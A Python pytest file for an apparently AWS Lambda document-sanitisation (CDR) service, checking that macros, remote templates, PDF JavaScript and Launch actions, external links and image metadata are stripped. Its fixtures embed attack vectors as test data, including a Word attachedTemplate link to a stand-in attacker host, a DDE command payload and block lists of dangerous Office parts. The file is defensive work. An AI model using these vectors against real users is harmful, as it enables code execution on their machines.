"""
Unit tests for CDR Lambda.
Run: cd src && pytest test_cdr.py -v

All fixtures are constructed in-memory — no external fixture files required.
"""

import decimal
import io
import json
import os
import time
import xml.etree.ElementTree as ET
import zipfile
from unittest.mock import MagicMock, patch

import openpyxl
import pikepdf
import pytest
from PIL import Image

# Set env vars before importing the module
os.environ.setdefault("SANITISED_BUCKET", "test-sanitised")
os.environ.setdefault("QUARANTINE_BUCKET", "test-quarantine")
os.environ.setdefault("RESULT_TOPIC_ARN",  "arn:aws:sns:us-east-1:123456789012:test")

import lambda_function as cdr


# ── Helpers ────────────────────────────────────────────────────────────────────

def _make_docx_with_macro() -> bytes:
    """Return a minimal .docx zip containing a vbaProject.bin."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                   'package/2006/content-types"><Default Extension="rels" '
                   'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                   '</Types>')
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY_PAYLOAD")
        z.writestr("word/document.xml",
                   '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml'
                   '/2006/main"><w:body/></w:document>')
    return buf.getvalue()


def _make_docx_with_external_link() -> bytes:
    """Return a .docx whose .rels file references an externalLink."""
    buf = io.BytesIO()
    ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    ext_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink"
    rels_xml = (
        f'<?xml version="1.0"?>'
        f'<Relationships xmlns="{ns}">'
        f'<Relationship Id="rId1" Type="{ext_type}" Target="externalLinks/externalLink1.xml"/>'
        f'</Relationships>'
    )
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", _minimal_content_types())
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("xl/_rels/workbook.xml.rels", rels_xml)
        z.writestr("xl/workbook.xml", "<workbook/>")
    return buf.getvalue()


def _make_docx_with_remote_template(url: str = "http://attacker.example/evil.dotm") -> bytes:
    """Return a .docx whose word/_rels/settings.xml.rels references a remote template
    (the forefy/JXA-Persistency stage-1 vector: attachedTemplate rel → attacker http URL,
    which Word fetches on open to pull VBA). See docs/JXA-Persistency.md."""
    buf = io.BytesIO()
    ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    tmpl_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    settings_rels = (
        f'<?xml version="1.0"?>'
        f'<Relationships xmlns="{ns}">'
        f'<Relationship Id="rId1" Type="{tmpl_type}" Target="{url}" TargetMode="External"/>'
        f'</Relationships>'
    )
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", _minimal_content_types())
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/settings.xml",
                   '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml'
                   '/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/'
                   '2006/relationships"><w:attachedTemplate r:id="rId1"/></w:settings>')
        z.writestr("word/_rels/settings.xml.rels", settings_rels)
        z.writestr("word/document.xml",
                   '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml'
                   '/2006/main"><w:body/></w:document>')
    return buf.getvalue()


def _make_pdf_with_js() -> bytes:
    """Return a PDF with an /OpenAction JavaScript trigger."""
    pdf = pikepdf.Pdf.new()
    page = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Page"),
        MediaBox=pikepdf.Array([0, 0, 612, 792]),
    ))
    pdf.pages.append(pikepdf.Page(page))
    pdf.Root["/OpenAction"] = pikepdf.Dictionary(
        S=pikepdf.Name("/JavaScript"),
        JS=pikepdf.String("app.alert('pwned');"),
    )
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def _make_image_with_exif(fmt: str = "JPEG") -> bytes:
    """Return a tiny JPEG/PNG with valid EXIF data embedded."""
    import struct
    # Build a minimal but structurally valid EXIF block (no piexif dependency)
    # TIFF header (little-endian) + 1 IFD entry (Make tag = "Camera\0")
    tiff = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
    ifd  = struct.pack("<H", 1)                          # 1 entry
    ifd += struct.pack("<HHI", 0x010F, 2, 7)             # tag, ASCII type, count
    ifd += struct.pack("<I", 26)                         # value offset
    ifd += struct.pack("<I", 0)                          # next IFD offset
    exif_bytes = b"Exif\x00\x00" + tiff + ifd + b"Camera\x00"

    img = Image.new("RGB", (64, 64), color=(128, 64, 32))
    buf = io.BytesIO()
    img.save(buf, format=fmt, exif=exif_bytes)
    return buf.getvalue()


def _minimal_rels() -> str:
    ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    return (f'<?xml version="1.0"?>'
            f'<Relationships xmlns="{ns}"/>')


def _minimal_content_types() -> str:
    return ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
            'package/2006/content-types"></Types>')


def _make_xlsb(rows: list[list] | None = None) -> bytes:
    """Build a minimal but pyxlsb-parseable xlsb ZIP fixture.

    Encodes BIFF12 records using the same framing that BIFF12Reader expects:
      - Record ID: variable-length LE bytes, high-bit continuation flag
      - Record length: standard LEB128
    Produces workbook.bin (WORKBOOK / SHEETS / SHEET / SHEETS_END / WORKBOOK_END)
    and worksheets/sheet1.bin (WORKSHEET / DIMENSION / SHEETDATA /
    [ROW + cells] / SHEETDATA_END / WORKSHEET_END).

    rows is a list of lists whose values may be:
      - float/int -> FLOAT record
      - str       -> FORMULA_STRING record (a formula's cached string result,
                     carried inline; this is the shape that lets a payload such
                     as '=DDE("cmd","/c calc")' ride in as a cell value). STRING
                     is deliberately not used: it indexes the shared string
                     table, which this fixture does not emit.
      - None      -> BLANK record
    Defaults to [[1.0, 2.0], [3.0, 4.0]].
    """
    import struct as _struct
    from pyxlsb import biff12

    if rows is None:
        rows = [[1.0, 2.0], [3.0, 4.0]]

    def _encode_id(rec_id: int) -> bytes:
        out = b""
        for _ in range(4):
            byte = rec_id & 0xFF
            rec_id >>= 8
            out += bytes([byte])
            if rec_id == 0:
                break
        return out

    def _encode_len(length: int) -> bytes:
        # LEB128
        out = b""
        while True:
            byte = length & 0x7F
            length >>= 7
            if length:
                byte |= 0x80
            out += bytes([byte])
            if not length:
                break
        return out

    def _rec(rec_id: int, payload: bytes = b"") -> bytes:
        return _encode_id(rec_id) + _encode_len(len(payload)) + payload

    def _u32(v: int) -> bytes:
        return v.to_bytes(4, "little")

    def _biff12_string(s: str) -> bytes:
        return _u32(len(s)) + s.encode("utf-16-le")

    n_rows = len(rows)
    n_cols = max((len(r) for r in rows), default=0)

    # workbook.bin: WORKBOOK / SHEETS / SHEET / SHEETS_END / WORKBOOK_END
    sheet_rid = "rId1"
    workbook_bin = (
        _rec(biff12.WORKBOOK) +
        _rec(biff12.SHEETS) +
        _rec(biff12.SHEET,
             _u32(0) + _u32(1) + _biff12_string(sheet_rid) + _biff12_string("Sheet1")) +
        _rec(biff12.SHEETS_END) +
        _rec(biff12.WORKBOOK_END)
    )

    # worksheets/sheet1.bin:
    # WORKSHEET / DIMENSION(r1,r2,c1,c2) / SHEETDATA / rows / SHEETDATA_END / WORKSHEET_END
    # DIMENSION payload: u32 r1, u32 r2, u32 c1, u32 c2 (0-based, inclusive)
    dim_payload = _u32(0) + _u32(max(n_rows - 1, 0)) + _u32(0) + _u32(max(n_cols - 1, 0))
    sheet_rows = b""
    for r_idx, row in enumerate(rows):
        sheet_rows += _rec(biff12.ROW, _u32(r_idx))
        for c_idx, val in enumerate(row):
            if val is None:
                sheet_rows += _rec(biff12.BLANK, _u32(c_idx) + _u32(0))
            elif isinstance(val, str):
                sheet_rows += _rec(biff12.FORMULA_STRING,
                                   _u32(c_idx) + _u32(0) + _biff12_string(val))
            else:
                sheet_rows += _rec(biff12.FLOAT,
                                   _u32(c_idx) + _u32(0) + _struct.pack("<d", float(val)))

    sheet_bin = (
        _rec(biff12.WORKSHEET) +
        _rec(biff12.DIMENSION, dim_payload) +
        _rec(biff12.SHEETDATA) +
        sheet_rows +
        _rec(biff12.SHEETDATA_END) +
        _rec(biff12.WORKSHEET_END)
    )

    rels_ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    sheet_rel_type = "http://schemas.microsoft.com/office/2006/relationships/xlBinaryIndex"
    rels_xml = (
        f'<?xml version="1.0"?>'
        f'<Relationships xmlns="{rels_ns}">'
        f'<Relationship Id="{sheet_rid}" Type="{sheet_rel_type}"'
        f' Target="worksheets/sheet1.bin"/>'
        f'</Relationships>'
    ).encode()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/workbook.bin", workbook_bin)
        z.writestr("xl/_rels/workbook.bin.rels", rels_xml)
        z.writestr("xl/worksheets/sheet1.bin", sheet_bin)
        z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY")
        z.writestr("[Content_Types].xml", _minimal_content_types())
        z.writestr("_rels/.rels", _minimal_rels())
    return buf.getvalue()


class TestConstants:

    def test_ext_remap_macro_to_clean(self):
        assert cdr.EXT_REMAP["docm"] == "docx"
        assert cdr.EXT_REMAP["xlsm"] == "xlsx"
        assert cdr.EXT_REMAP["pptm"] == "pptx"
        assert cdr.EXT_REMAP["dotm"] == "dotx"
        assert cdr.EXT_REMAP["xltm"] == "xltx"
        assert cdr.EXT_REMAP["xlam"] == "xlsx"
        assert cdr.EXT_REMAP["potm"] == "potx"
        assert cdr.EXT_REMAP["ppsm"] == "ppsx"
        assert cdr.EXT_REMAP["ppam"] == "pptx"

    def test_office_exts_contains_all_ooxml(self):
        expected = {
            "docx", "docm", "dotx", "dotm",
            "xlsx", "xlsm", "xltx", "xltm", "xlam", "xlsb",
            "pptx", "pptm", "potx", "potm", "ppsx", "ppsm", "ppam",
        }
        assert expected == cdr.OFFICE_EXTS

    def test_legacy_exts(self):
        assert cdr.LEGACY_EXTS == {"doc", "xls", "ppt"}

    def test_macro_content_type_remap_keys(self):
        assert "application/vnd.ms-word.document.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP
        assert "application/vnd.ms-excel.sheet.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP
        assert "application/vnd.ms-powerpoint.presentation.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP

    def test_strip_rel_types_includes_template_injection(self):
        assert "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" \
            in cdr.STRIP_REL_TYPES
        assert "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument" \
            in cdr.STRIP_REL_TYPES
        assert "http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" \
            in cdr.STRIP_REL_TYPES

    def test_strip_zip_entries_includes_new_paths(self):
        dangerous = ["customXml/", "word/attachedToolbars/", "xl/externalLinks/",
                     "xl/macrosheets/", "xl/queryTables/", "xl/connections.xml", "ppt/tags/"]
        for entry in dangerous:
            assert entry in cdr.STRIP_ZIP_ENTRIES, f"{entry} missing from STRIP_ZIP_ENTRIES"

    def test_macro_content_type_remap_includes_xlsb(self):
        assert "application/vnd.ms-excel.sheet.binary.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP

    def test_sanitised_key_remaps_extension(self):
        """Audit fix: the original extension is kept (not dropped) so a macro-bearing
        upload can never collide with an unrelated already-clean upload of the same
        basename under the remapped extension (e.g. report.xlsm and report.xlsx)."""
        assert cdr._sanitised_key("uploads/report.xlsm", "xlsx") == "sanitised/uploads/report.xlsm.xlsx"

    def test_sanitised_key_unchanged_extension(self):
        assert cdr._sanitised_key("uploads/report.docx", "docx") == "sanitised/uploads/report.docx"

    def test_sanitised_key_no_ext(self):
        assert cdr._sanitised_key("uploads/datafile", "datafile") == "sanitised/uploads/datafile"

    def test_sanitised_key_no_basename_collision_across_extensions(self):
        """report.docm (macro-bearing) and report.docx (already clean) are distinct
        source uploads; their sanitised outputs must not collide on the same key."""
        docm_key = cdr._sanitised_key("uploads/report.docm", "docx")
        docx_key = cdr._sanitised_key("uploads/report.docx", "docx")
        assert docm_key != docx_key


class TestSnsSubjectSafe:
    """Audit fix: a crafted key with SNS-illegal characters must not break sns.publish()
    and be silently swallowed by _publish_result_safe's fault-isolating try/except."""

    def test_control_chars_stripped(self):
        subject = cdr._sns_subject_safe("CDR/sanitised: evil\nkey\x00.docx")
        assert "\n" not in subject
        assert "\x00" not in subject

    def test_non_ascii_stripped(self):
        subject = cdr._sns_subject_safe("CDR/sanitised: résumé.docx")
        assert all(0x20 <= ord(c) <= 0x7e for c in subject)

    def test_truncated_to_limit(self):
        subject = cdr._sns_subject_safe("x" * 500, limit=100)
        assert len(subject) == 100

    @patch.object(cdr, "sns")
    def test_publish_result_safe_uses_sanitised_subject(self, mock_sns):
        cdr.RESULT_TOPIC_ARN = "arn:aws:sns:us-east-1:123456789012:test"
        try:
            cdr._publish_result_safe("src", "evil\nkey.docx", "sanitised", {})
        finally:
            cdr.RESULT_TOPIC_ARN = ""
        subject = mock_sns.publish.call_args.kwargs["Subject"]
        assert "\n" not in subject


class TestPassthroughMetricEmptyExtension:
    """Audit fix: CloudWatch rejects an empty Dimensions[].Value client-side, which would
    otherwise drop BOTH datapoints in the request (including the mandatory dimensionless
    rollup the alarm depends on) for a file with no extension at all."""

    @patch.object(cdr, "cw")
    def test_empty_extension_does_not_crash_metric_emission(self, mock_cw):
        cdr._emit_passthrough_metric("")
        call_kwargs = mock_cw.put_metric_data.call_args.kwargs
        dims = call_kwargs["MetricData"][1]["Dimensions"]
        assert dims[0]["Value"] != ""

    @patch.object(cdr, "cw")
    def test_normal_extension_still_used_as_dimension(self, mock_cw):
        cdr._emit_passthrough_metric("exe")
        call_kwargs = mock_cw.put_metric_data.call_args.kwargs
        dims = call_kwargs["MetricData"][1]["Dimensions"]
        assert dims[0]["Value"] == "exe"


class TestLegacyOleEmitsPassthroughMetric:
    """Audit fix: legacy OLE (.doc/.xls/.ppt) uploads are quarantined but must also
    increment the PassthroughFiles metric like other fail-closed carriers, or the
    CdrPassthroughAlarm under-counts and legacy uploads are invisible in dashboards."""

    def test_legacy_ext_sets_passthrough_metric(self):
        result = cdr.cdr_dispatch(b"\xd0\xcf\x11\xe0" + b"\x00" * 100, "doc")
        assert result["status"] == "unsupported-format"
        assert result["metric"] == "passthrough"


class TestEncodedFieldKeywordWordBoundary:
    """Audit fix: a plain substring check (`kw in text`) false-positives on benign words
    that merely contain a keyword, e.g. 'PADDED' contains 'DDE', 'UNLINKING' contains
    'LINK', 'RECALL' contains 'CALL' — corrupting legitimate text that was never a field
    code. Must use word-boundary matching instead."""

    def test_benign_substring_not_neutralised(self):
        text, count = cdr._neutralise_encoded_field_codes("&#80;ADDED text here")
        assert count == 0
        assert "_CDR_REMOVED_" not in text

    def test_benign_unlinking_not_neutralised(self):
        text, count = cdr._neutralise_encoded_field_codes("&#85;NLINKING text")
        assert count == 0
        assert "_CDR_REMOVED_" not in text

    def test_malicious_dde_still_neutralised(self):
        text, count = cdr._neutralise_encoded_field_codes("&#68;DE evil")
        assert count == 1
        assert "_CDR_REMOVED_" in text

    def test_malicious_macrobutton_still_neutralised(self):
        text, count = cdr._neutralise_encoded_field_codes("&#77;ACROBUTTON Hidden Click")
        assert count == 1
        assert "_CDR_REMOVED_" in text


# ── Office CDR tests ───────────────────────────────────────────────────────────

class TestOfficeCDR:

    def test_vba_macro_removed(self):
        data = _make_docx_with_macro()
        clean, report = cdr.cdr_office(data, "docx")

        # vbaProject.bin must not appear in the output zip
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names), \
            "vbaProject.bin still present after CDR"

        assert any("vbaProject.bin" in r for r in report["removed"]), \
            "CDR report did not record macro removal"

    def test_remote_template_chain_severed(self):
        """forefy/JXA-Persistency stage 1: a .docx with an attachedTemplate rel pointing at
        an attacker http server (Word fetches it on open to pull VBA → osascript → LaunchAgent
        persistence). CDR must delete the rel so Word has no URL to fetch and the chain never
        starts. See docs/JXA-Persistency.md."""
        url = "http://attacker.example/evil.dotm"
        data = _make_docx_with_remote_template(url)
        clean, report = cdr.cdr_office(data, "docx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            rels = z.read("word/_rels/settings.xml.rels").decode()

        assert "attachedTemplate" not in rels, \
            "attachedTemplate relationship survived CDR — remote-template fetch still possible"
        assert url not in rels, "attacker template URL still present in output rels"
        assert any("attachedtemplate" in r.lower() for r in report["removed"]), \
            "CDR report did not record the attachedTemplate rel removal"

    @pytest.mark.parametrize("evasive_name", [
        "./word/vbaProject.bin",
        "word//vbaProject.bin",
        "/word/vbaProject.bin",
        "a/../word/vbaProject.bin",
    ])
    def test_vba_macro_removed_path_evasion(self, evasive_name):
        """A ZIP entry name with a non-canonical path (./, //, leading /, ..) must still
        be recognised as word/vbaProject.bin — these all resolve to the same OPC part at
        open time even though they don't literally start with the STRIP_ZIP_ENTRIES prefix."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr(evasive_name, b"\xd0\xcf\x11\xe0MACRO_BINARY_PAYLOAD")
            z.writestr("word/document.xml",
                       '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml'
                       '/2006/main"><w:body/></w:document>')
        data = buf.getvalue()

        clean, report = cdr.cdr_office(data, "docx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names), \
            f"vbaProject.bin still present after CDR (evasive name: {evasive_name!r})"
        assert any("vbaproject.bin" in r.lower() for r in report["removed"]), \
            f"CDR report did not record macro removal (evasive name: {evasive_name!r})"

    def test_external_link_stripped_from_rels(self):
        data = _make_docx_with_external_link()
        clean, report = cdr.cdr_office(data, "xlsx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            rels_raw = z.read("xl/_rels/workbook.xml.rels")

        assert b"externalLink" not in rels_raw, \
            "External link relationship still present in sanitised .rels"
        assert any("externallink" in r.lower() for r in report["removed"])

    def test_clean_office_file_unchanged_structure(self):
        """A macro-free docx should pass through with the same zip entries."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/document.xml", "<w:document/>")

        data = buf.getvalue()
        clean, report = cdr.cdr_office(data, "docx")

        assert report["removed"] == [], "Clean file should have no removals"
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert "word/document.xml" in z.namelist()

    def test_custom_xml_stripped(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("customXml/item1.xml", "<root><data>payload</data></root>")
            z.writestr("customXml/_rels/item1.xml.rels", _minimal_rels())

        clean, report = cdr.cdr_office(buf.getvalue(), "docx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
        assert not any(n.startswith("customXml/") for n in names), \
            "customXml/ entries still present after CDR"
        assert any("customXml" in r for r in report["removed"])

    def test_custom_xml_relationship_also_dropped(self):
        """Regression: stripping the customXml PART must also drop the relationship that
        references it, or the surviving rel dangles at a deleted part and breaks strict OPC
        consumers (python-docx / Word) — corrupting otherwise-legitimate documents."""
        ns = "http://schemas.openxmlformats.org/package/2006/relationships"
        cx_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml"
        doc_rels = (
            f'<?xml version="1.0"?><Relationships xmlns="{ns}">'
            f'<Relationship Id="rId1" Type="{cx_type}" Target="../customXml/item1.xml"/>'
            f'</Relationships>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("word/_rels/document.xml.rels", doc_rels)
            z.writestr("customXml/item1.xml", "<root><data>payload</data></root>")
            z.writestr("customXml/_rels/item1.xml.rels", _minimal_rels())

        clean, report = cdr.cdr_office(buf.getvalue(), "docx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
            doc_rels_out = z.read("word/_rels/document.xml.rels")
        # Part gone AND the dangling relationship to it gone.
        assert not any(n.startswith("customXml/") for n in names)
        assert b"customXml" not in doc_rels_out, \
            "dangling customXml relationship survived — would corrupt the document"

    def test_external_links_dir_stripped(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("xl/workbook.xml", "<workbook/>")
            z.writestr("xl/externalLinks/externalLink1.xml", "<externalLink/>")

        clean, report = cdr.cdr_office(buf.getvalue(), "xlsx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
        assert not any(n.startswith("xl/externalLinks/") for n in names)
        assert any("externalLinks" in r for r in report["removed"])


# ── PDF CDR tests ──────────────────────────────────────────────────────────────

class TestPdfCDR:

    def test_open_action_js_removed(self):
        data = _make_pdf_with_js()
        clean, report = cdr.cdr_pdf(data)

        with pikepdf.open(io.BytesIO(clean)) as pdf:
            assert "/OpenAction" not in pdf.Root, \
                "/OpenAction still present in sanitised PDF"

        assert any("/OpenAction" in r for r in report["removed"])

    def test_clean_pdf_produces_valid_output(self):
        """A PDF with no dangerous content should round-trip cleanly."""
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)

        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert report["removed"] == []
        with pikepdf.open(io.BytesIO(clean)) as out:
            assert len(out.pages) == 1

    def test_page_annotation_action_removed(self):
        pdf = pikepdf.Pdf.new()
        annot = pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"),
            Subtype=pikepdf.Name("/Link"),
            A=pikepdf.Dictionary(
                S=pikepdf.Name("/Launch"),
                F=pikepdf.Dictionary(
                    Type=pikepdf.Name("/Filespec"),
                    F=pikepdf.String("malware.exe"),
                ),
            ),
        )
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)

        clean, report = cdr.cdr_pdf(buf.getvalue())
        with pikepdf.open(io.BytesIO(clean)) as out:
            annots = out.pages[0].get("/Annots", [])
            for a in annots:
                assert "/A" not in a, "Launch action still present in annotation"

        # Annotation actions are now deleted unconditionally (denylist-free); the report
        # records the /A removal rather than the specific action type.
        assert any("annot/A" in r for r in report["removed"])


# ── Image CDR tests ────────────────────────────────────────────────────────────

class TestImageCDR:

    def test_jpeg_exif_stripped(self):
        data = _make_image_with_exif("JPEG")
        clean, report = cdr.cdr_image(data, "jpg")

        img = Image.open(io.BytesIO(clean))
        exif = img.info.get("exif", b"")
        # After re-encode with no exif= kwarg, the EXIF chunk should be absent
        assert exif == b"" or exif is None, "EXIF not stripped from sanitised JPEG"
        assert "EXIF" in report["removed"]

    def test_png_roundtrips_as_valid_image(self):
        img = Image.new("RGBA", (32, 32), (255, 0, 0, 128))
        buf = io.BytesIO()
        img.save(buf, format="PNG")

        clean, report = cdr.cdr_image(buf.getvalue(), "png")
        result = Image.open(io.BytesIO(clean))
        assert result.size == (32, 32)
        assert result.mode == "RGBA"

    def test_gif_stays_gif(self):
        """GIF is re-encoded as GIF — format is preserved for downstream consumers."""
        img = Image.new("P", (16, 16))
        buf = io.BytesIO()
        img.save(buf, format="GIF")

        clean, report = cdr.cdr_image(buf.getvalue(), "gif")
        result = Image.open(io.BytesIO(clean))
        assert result.format == "GIF"

    def test_gif_comment_stripped(self):
        """GIF comment extension blocks are suppressed on re-encode."""
        img = Image.new("RGB", (16, 16), color="red")
        buf = io.BytesIO()
        img.save(buf, format="GIF", comment=b"malicious comment payload")

        clean, report = cdr.cdr_image(buf.getvalue(), "gif")
        result = Image.open(io.BytesIO(clean))
        assert not result.info.get("comment"), "GIF comment extension not stripped"
        assert "comment" in report["removed"]

    def test_gif_content_type_is_gif(self):
        """GIF output stays GIF; _EXT_CONTENT_TYPE must map gif → image/gif."""
        assert cdr._EXT_CONTENT_TYPE.get("gif") == "image/gif"
        assert cdr._content_type_for_ext("gif", "image/gif") == "image/gif"

    def test_tiff_multiframe_all_frames_preserved(self):
        """Multi-frame TIFF is re-encoded frame-by-frame — all frames survive CDR."""
        frames = [Image.new("RGB", (8, 8), color=(i * 60, 0, 0)) for i in range(3)]
        buf = io.BytesIO()
        frames[0].save(buf, format="TIFF", save_all=True, append_images=frames[1:])

        clean, report = cdr.cdr_image(buf.getvalue(), "tiff")
        result = Image.open(io.BytesIO(clean))
        assert result.n_frames == 3, f"Expected 3 frames, got {result.n_frames}"

    def test_tiff_multiframe_metadata_stripped(self):
        """Multi-frame TIFF re-encode strips EXIF from all frames."""
        import struct
        tiff_hdr = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
        ifd = struct.pack("<H", 1) + struct.pack("<HHI", 0x010F, 2, 7) \
            + struct.pack("<I", 26) + struct.pack("<I", 0)
        exif_bytes = b"Exif\x00\x00" + tiff_hdr + ifd + b"Camera\x00"

        frames = [Image.new("RGB", (8, 8), color=(i * 60, 0, 0)) for i in range(2)]
        buf = io.BytesIO()
        frames[0].save(buf, format="TIFF", save_all=True,
                       append_images=frames[1:], exif=exif_bytes)

        clean, report = cdr.cdr_image(buf.getvalue(), "tiff")
        result = Image.open(io.BytesIO(clean))
        assert not result.info.get("exif"), "EXIF not stripped from multi-frame TIFF"
        assert result.n_frames == 2

    def test_webp_content_type_correct(self):
        """webp output stays webp — confirm the content type map is consistent with fmt_map."""
        assert cdr._EXT_CONTENT_TYPE.get("webp") == "image/webp"
        assert cdr._content_type_for_ext("webp", "image/webp") == "image/webp"

    # ── Audit fix: an explicit CDR_MAX_IMAGE_PIXELS cap (default 40 MP), sized to this
    #    Lambda's memory budget, now fails closed instead of relying on Pillow's own
    #    undocumented default (89.5M soft-warn / 179M hard-error) — the soft-warn band
    #    used to decode silently since default warning filters don't raise ──
    def test_decompression_bomb_over_pixel_cap_rejected(self):
        import math
        side = math.isqrt(cdr.Image.MAX_IMAGE_PIXELS) + 1000  # comfortably over the cap
        buf = io.BytesIO()
        Image.new("RGB", (side, side), "blue").save(buf, format="PNG")
        with pytest.raises(Exception):
            cdr.cdr_image(buf.getvalue(), "png")

    def test_image_under_pixel_cap_still_processed(self):
        img = Image.new("RGB", (64, 64), "green")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        clean, report = cdr.cdr_image(buf.getvalue(), "png")
        assert Image.open(io.BytesIO(clean)).size == (64, 64)

    # ── Audit fix: only TIFF got frame-by-frame re-encoding; animated GIF/WEBP fell
    #    into the single-frame `else` branch and were silently collapsed to their first
    #    frame — a real data-loss bug, not just a metadata-stripping gap ──
    def test_animated_gif_all_frames_preserved(self):
        frames = [Image.new("RGB", (10, 10), (i * 40, 0, 0)) for i in range(5)]
        buf = io.BytesIO()
        frames[0].save(buf, format="GIF", save_all=True, append_images=frames[1:],
                        duration=100, loop=0)
        clean, report = cdr.cdr_image(buf.getvalue(), "gif")
        with Image.open(io.BytesIO(clean)) as out:
            assert getattr(out, "n_frames", 1) == 5

    def test_animated_webp_all_frames_preserved(self):
        frames = [Image.new("RGB", (10, 10), (i * 40, 0, 0)) for i in range(4)]
        buf = io.BytesIO()
        frames[0].save(buf, format="WEBP", save_all=True, append_images=frames[1:],
                        duration=100, loop=0)
        clean, report = cdr.cdr_image(buf.getvalue(), "webp")
        with Image.open(io.BytesIO(clean)) as out:
            assert getattr(out, "n_frames", 1) == 4

    def test_single_frame_gif_still_processed(self):
        buf = io.BytesIO()
        Image.new("RGB", (10, 10), (1, 2, 3)).save(buf, format="GIF")
        clean, report = cdr.cdr_image(buf.getvalue(), "gif")
        with Image.open(io.BytesIO(clean)) as out:
            assert getattr(out, "n_frames", 1) == 1

    @pytest.mark.parametrize("fmt,ext", [("JPEG", "jpg"), ("PNG", "png")])
    def test_metadata_report_is_conditional_not_decorative(self, fmt, ext):
        """The report must reflect what was actually found, not fire unconditionally.

        Every other assertion in this class is satisfied by Pillow's re-encode alone:
        a bare `Image.open(...).save(...)` with no CDR logic whatsoever drops EXIF just
        as completely, so an absence check would still pass if the metadata sweep were
        deleted outright. That is not a security hole — the output is clean either way —
        but it means those tests cannot distinguish the sweep working from the sweep
        being absent.

        A conditional report can only come from real detection, so this is the one
        claim about cdr_image that the re-encode cannot satisfy on its own: silent on
        an image that never carried EXIF, and naming it on one that did."""
        clean_src = io.BytesIO()
        Image.new("RGB", (8, 8), (255, 0, 0)).save(clean_src, format=fmt)
        _, clean_report = cdr.cdr_image(clean_src.getvalue(), ext)
        assert "EXIF" not in clean_report["removed"], \
            f"CDR claimed EXIF removal on an image that never had EXIF: {clean_report['removed']}"

        # Positive control: the same code path DOES report EXIF when it is present, so a
        # pass above cannot come from a report that is simply always empty.
